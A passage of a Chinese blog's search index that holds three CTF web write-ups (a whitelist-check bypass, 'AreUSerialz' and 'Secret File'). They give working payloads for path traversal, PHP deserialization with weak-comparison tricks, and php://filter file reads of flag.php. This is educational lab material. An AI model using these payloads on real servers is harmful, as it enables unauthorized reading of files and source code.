class="line">因此，满足这三个条件，最后才能执行include函数</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、接下来看看<span class="built_in">checkFile</span>()函数中的内容</span><br><span class="line">(<span class="number">1</span>)第一个<span class="keyword">if</span>不能<span class="keyword">return</span> flase，因为这里不能执行&#123;&#125;中的语句，因为不管<span class="keyword">return</span> <span class="literal">true</span>或者<span class="keyword">return</span> <span class="literal">false</span>，都会</span><br><span class="line">终止当前函数的执行，所以需要满足<span class="keyword">if</span> (<span class="literal">false</span> || <span class="literal">false</span>)才能继续执行下面的代码，即，$page存在并且是字符串;</span><br><span class="line">(<span class="number">2</span>)第<span class="number">2</span>个语句可以执行，返回<span class="literal">true</span></span><br><span class="line">那么，就需要$whitelist中存在$page</span><br><span class="line">注：in_array函数是检查数组中是否存在某个值(找到<span class="literal">true</span>；找不<span class="literal">false</span>),特别注意这是在数组的键值中找，不包括键</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、这样的话我们就可以构造<span class="built_in">payload</span></span><br><span class="line">(<span class="number">1</span>)测试payload1：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php</span></span><br><span class="line">执行了source.php，输出了里面的内容</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)测试payload2：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php../../../../../ffffllllaaaagggg</span></span><br><span class="line">我想得到ffffllllaaaagggg时就出问题了，因为ffffllllaaaagggg不在$whitelist数组的键值中，并且</span><br><span class="line">继续执行代码后，下面$_page=source.php../../../../../../../ffffllllaaaagggg，第<span class="number">3</span>个<span class="keyword">if</span>语句<span class="literal">false</span>，</span><br><span class="line">urldecode后$_page=source.php../../../../../../../ffffllllaaaagggg，mb_substr后还是这个，第<span class="number">4</span></span><br><span class="line">个<span class="keyword">if</span>语句还是<span class="literal">false</span>，最后输出you can<span class="number">&#x27;</span>t see it，还<span class="keyword">return</span> <span class="literal">false</span>，这还玩啥</span><br><span class="line"></span><br><span class="line">该如何解决？我需要include ffffllllaaaagggg文件，而且需要使用../，怎样绕过？</span><br><span class="line">注意到<span class="built_in">mb_strpos</span>($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)没，我们构造一个?即可</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)测试payload3：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php?../../../../../../ffffllllaaaagggg</span></span><br><span class="line">构造?的话，第<span class="number">2</span>个<span class="keyword">if</span>语句就不能返回<span class="literal">true</span>了，第<span class="number">3</span>个<span class="keyword">if</span>语句一样，也不能执行<span class="keyword">return</span>语句，第<span class="number">4</span>个<span class="keyword">if</span>语句需要满足<span class="keyword">if</span></span><br><span class="line">(<span class="literal">true</span>)，因为需要执行&#123;&#125;中的内容，最后使得<span class="built_in">checkFile</span>()函数返回的布尔类型为<span class="built_in"><span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)payload3执行流程：此时file=source.php?../../../../../../ffffllllaaaagggg</span><br><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">$_page=source.php</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="literal">true</span>，退出checkFile函数，此时核心代码中已满足<span class="keyword">if</span>(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>)，即执行include函数</span><br><span class="line">最后<span class="built_in">include</span>(source.php?../../../../../../ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析得到payload如下</p><blockquote><p><a href="http://xxx/index.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://xxx/index.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p></blockquote><p>访问即可得到flag。</p><p>执行流程：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">$_page=source.php%<span class="number">3f</span>../../../../../ffffllllaaaagggg</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">urldecode执行后，$_page=source.php?../../../../../ffffllllaaaagggg</span><br><span class="line">执行mb_substr后$_page=source.php</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">下面核心代码执行同理</span><br><span class="line">最后<span class="built_in">include</span>(source.php%<span class="number">253f</span>../../../../../ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>（1）只要函数中return执行了，就会立即结束函数的执行，继续执行函数外的代码；<br>（2）||表示任意||两边只要有一边是true，整体就返回true；<br>（3）in_array函数是检查数组中是否存在某个值(找到true；找不false),特别注意这是在数组的键值中找，不包括键；<br>（4）mb_strpos查找目标首次出现的位置，从0开始；<br>（5）mb_substr返回字符串，特别注意的是：mb_strpos获取的数字，在mb_substr不是从0开始，而是代表返回的长度。</p><h2 id="最后说一句"><a href="#最后说一句" class="headerlink" title="最后说一句"></a>最后说一句</h2><p>其实看了题解也没太看懂，存着，有空多看看，总有一天会看懂的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz(PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/"/>
      <url>/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz(PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>真的不会写</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>进入链接，一大串代码来袭</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?<span class="function">php</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">include</span><span class="params">(<span class="string">&quot;flag.php&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="keyword">this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;filename) &amp;&amp; <span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>((string)$<span class="keyword">this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="built_in">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = <span class="built_in">file_put_contents</span>($<span class="keyword">this</span>-&gt;filename, $<span class="keyword">this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = <span class="built_in">file_get_contents</span>($<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        echo <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="built_in">strlen</span>($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">ord</span>($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; <span class="built_in">ord</span>($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">is_valid</span>($str)) &#123;</span><br><span class="line">        $obj = <span class="built_in">unserialize</span>($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂看不懂看不懂…直接看大佬总结出来的知识</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>PHP反序列化漏洞、弱类型比较。</p><p>经过分析，这个题目需要传入一个序列化之后的类对象，并且要绕过两层防护：</p><h2 id="两个防护："><a href="#两个防护：" class="headerlink" title="两个防护："></a>两个防护：</h2><h4 id="一：is-valid"><a href="#一：is-valid" class="headerlink" title="一：is_valid()"></a>一：is_valid()</h4><p>要求传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p><p><strong>绕过方法</strong>：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。</p><h4 id="二：destruct-魔术方法"><a href="#二：destruct-魔术方法" class="headerlink" title="二：destruct()魔术方法"></a>二：destruct()魔术方法</h4><p>op===”2”，是强比较</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而在process()函数中,op==”2”是弱比较</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="keyword">this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>绕过方法</strong>：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$op=<span class="number">2</span>;</span><br><span class="line">$oop=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>($op===<span class="string">&quot;2&quot;</span>)</span><br><span class="line">echo <span class="string">&quot;数字2与字符2强比较成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">echo <span class="string">&quot;数字2与字符2强比较失败&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($op==<span class="string">&quot;2&quot;</span>)</span><br><span class="line"> echo <span class="string">&quot;数字2与字符2弱比较成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">echo <span class="string">&quot;数字2与字符2弱比较失败&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）"><a href="#本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）" class="headerlink" title="本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）"></a>本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span>  $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content = <span class="string">&quot;1&quot;</span>;        <span class="comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">FileHandler</span>();</span><br><span class="line">$b = <span class="built_in">serialize</span>($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>序列化结果：</strong></p><blockquote><p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}</p></blockquote><p><strong>payload：</strong></p><blockquote><p>/?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}</p></blockquote><p>f12查看源码，找到flag<br><img src="https://img-blog.csdnimg.cn/20210518175816476.png" alt="在这里插入图片描述"></p><h4 id="也可以使用伪协议"><a href="#也可以使用伪协议" class="headerlink" title="也可以使用伪协议"></a>也可以使用伪协议</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">FileHandler</span>();</span><br><span class="line">$b = <span class="built_in">serialize</span>($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：</p><blockquote><p>/?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;N;}</p></blockquote><p>得到一串base编码<br><img src="https://img-blog.csdnimg.cn/20210518180203370.png" alt="在这里插入图片描述">解码得到flag<br><img src="https://img-blog.csdnimg.cn/20210518180408894.png" alt="在这里插入图片描述"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>PHP反序列化漏洞和弱类型比较还是比较懵懂<br>路漫漫，加油学吧</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF[极客大挑战2019]Secret File</title>
      <link href="/2021/11/11/BUUCTF-Web-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/"/>
      <url>/2021/11/11/BUUCTF-Web-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/</url>
      
        <content type="html"><![CDATA[<p>朋友们好啊我是混元形意太极门掌门人马保国<br>刚才有个朋友发给我一个链接，我一看！嗷！原来是CTF题啊！他非要让我解解，我说可以。<br>诶…我啪的一下就进入了这个链接<br><img src="https://img-blog.csdnimg.cn/20201214221541596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>虽然我不想知道她的秘密啊…但是还是要不情愿的打开源页面查看源代码， 发现其中存在隐藏链接啊</p><p><img src="https://img-blog.csdnimg.cn/20201214221736450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶…接着不情愿的点击这个隐藏链接跳转页面<br><img src="https://img-blog.csdnimg.cn/2020121422193574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>嗷！再次不情愿的点击SECRET<br><img src="https://img-blog.csdnimg.cn/20201214222023826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>哈！不讲武德…没看清！？ 那就怪不得我马某人掏出burp抓包了！<br><img src="https://img-blog.csdnimg.cn/20201214223443846.png#pic_center" alt="在这里插入图片描述"><br>接着我以GET方式进入 action.php 得到一个秘密文件 secr3t.php<br>哼！年轻人！<br><img src="https://img-blog.csdnimg.cn/20201214222811694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我笑了一下进入这个秘密文件后出现以下界面啊<br><img src="https://img-blog.csdnimg.cn/20201214223835338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们试着以GET方式传入变量file，值为flag.php<br>啊…哈！骗！偷袭！很快嗷！发现看不到flag……<br><img src="https://img-blog.csdnimg.cn/20201214224246562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶…百度搜索PHP伪协议慢慢看一会儿…了解到这里应该需要结合php://filter协议流读取目标文件内容啊<br>嗷！就是在secr3t.php后面添加<br>？file=php://filter/read=convert.base64-encode/resource=flag.php<br>然后进行访问得到一串代码嗷<br><img src="https://img-blog.csdnimg.cn/20201214225106373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看出这里需要用到base64解码啊！<br>我一个闪电五连鞭!<br>解码成功得到flag!<br><img src="https://img-blog.csdnimg.cn/20201214225312155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶传统武术点到为止，他已经输了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
